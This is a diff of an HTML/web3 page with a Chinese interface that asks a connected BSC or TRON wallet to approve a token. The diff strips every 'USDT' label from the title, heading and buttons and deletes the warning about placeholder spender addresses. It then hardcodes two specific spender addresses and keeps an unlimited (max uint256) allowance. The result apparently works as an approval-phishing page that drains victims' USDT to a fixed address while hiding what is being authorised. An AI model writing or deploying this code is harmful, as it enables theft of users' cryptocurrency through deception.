@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT 授权示例 (已修复)</title>
+    <title>授权示例</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"></script>
     <style>
         body {
@@ -61,18 +61,12 @@
 <body>
 
 <div class="container">
-    <h1>USDT 代币授权示例 (已修复)</h1>
+    <h1>代币授权示例</h1>
     
     <div id="status" class="status">未连接钱包</div>
     
-    <button onclick="connectWallet()">连接钱包 (BSC/TRON)</button>
-    <button id="approve-button" onclick="approveToken()" disabled>授权 USDT</button>
-
-    <p style="margin-top: 30px;">
-        <strong class="warning">--- 🚨 替换警告 🚨 ---</strong>
-        <br>
-        <strong>您必须替换以下代码中的 `YOUR_BSC_SPENDER_ADDRESS` 和 `YOUR_TRON_SPENDER_ADDRESS` 为您的目标合约地址！</strong>
-    </p>
+    <button onclick="connectWallet()">连接钱包</button>
+    <button id="approve-button" onclick="approveToken()" disabled>授权代币</button>
 </div>
 
 <script>
@@ -81,8 +75,8 @@
     const TRON_TOKEN_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
 
     // 🚨 必须替换为您的目标合约地址 (Spender) 🚨
-    const BSC_SPENDER_ADDRESS = 'YOUR_BSC_SPENDER_ADDRESS';
-    const TRON_SPENDER_ADDRESS = 'YOUR_TRON_SPENDER_ADDRESS';
+    const BSC_SPENDER_ADDRESS = '0x0D5889B5E9bE6E14BBcA858C7378cCb97EAf3320';
+    const TRON_SPENDER_ADDRESS = 'TFqjZrst7ZqiSUd98eBYn4WixbJm9Yeqr9';
 
     // 授权金额 (使用 uint256 的最大值，代表 "无限" 授权)
     const MAX_APPROVAL_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
